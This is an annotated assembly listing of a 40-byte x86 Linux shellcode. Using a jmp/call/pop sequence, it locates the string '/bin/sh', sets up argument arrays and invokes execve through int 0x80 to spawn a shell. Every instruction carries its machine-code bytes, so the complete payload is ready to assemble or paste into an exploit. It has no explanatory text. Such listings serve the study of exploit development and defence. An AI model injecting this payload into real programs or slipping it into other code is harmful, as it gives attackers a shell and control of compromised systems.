; total: 40 bytes

bits 32

_start:
    jmp short loc_a                ; 0x00000000   2   eb1a
loc_b:
    pop esi                        ; 0x00000002   1   5e
    xor eax, eax                   ; 0x00000003   2   31c0
    mov byte [esi + 7], al         ; 0x00000005   3   884607
    lea ebx, [esi]                 ; 0x00000008   2   8d1e
    mov dword [esi + 8], ebx       ; 0x0000000a   3   895e08
    mov dword [esi + 0xc], eax     ; 0x0000000d   3   89460c
    mov al, 0xb                    ; 0x00000010   2   b00b   ; __NR_execve
    mov ebx, esi                   ; 0x00000012   2   89f3
    lea ecx, [esi + 8]             ; 0x00000014   3   8d4e08
    lea edx, [esi + 0xc]           ; 0x00000017   3   8d560c
    int 0x80                       ; 0x0000001a   2   cd80
loc_a:
    call loc_b                     ; 0x0000001c   5   e8e1ffffff
    db '/bin/sh'                   ; 0x00000021   7